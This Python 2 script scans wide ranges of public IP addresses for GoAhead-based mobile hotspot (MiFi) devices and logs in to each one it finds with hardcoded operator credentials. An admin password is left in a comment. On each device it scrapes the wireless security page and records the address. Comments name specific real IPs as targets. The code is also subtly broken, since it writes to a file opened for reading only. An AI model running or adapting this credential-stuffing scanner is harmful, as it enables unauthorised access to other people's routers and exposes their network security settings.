import requests 
from requests.auth import HTTPBasicAuth 
from bs4 import BeautifulSoup 


#http://181.135.166.30/main.asp http://181.136.0.42/http://181.136.2.253/

mifis = open("mifi.csv", "r")

for e in range(180,256):
    e = e + 1
    for l in range(135,256):
        l = l + 1
        for i in range(1,256):
            i = i + 1
            for s in range(70,256):
                s = s + 1
                ip = str(e)+'.'+str(l)+'.'+str(i)+'.'+str(s)
                
                try:
                    print "probando........"+ip
                    r = requests.get("http://"+ip+":80/main.asp", timeout=2)
                    head = r.headers
                    b= 'WWW-Authenticate' in head
                    if b == True:
                        n = r.headers['WWW-Authenticate']
                        print n
                        mifi = 'Basic realm="GoAhead"'
                        if n==mifi:
                            r1 = requests.get("http://"+ip+":80/wireless/security.asp", auth=HTTPBasicAuth('operator', 'justr34d'), timeout=None)
                            #auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.5)
                            bs = BeautifulSoup(r1.content, "html.parser")
                            
                            print ip+".....................ok mifi "+mifi
                            x = str(mifi)
                            print str(r1.status_code)
                            text1 = bs.find_all("select", {"name":"ssidIndex"})
                            for ssid in bs.find_all("option", {"value":"0"}):
                                print ssid
                                mifis.write(ip+','+x+'\n')
                                
                            
                            #mifis.write(ip+','+x+'\n')

                            
                    
                except:
                    pass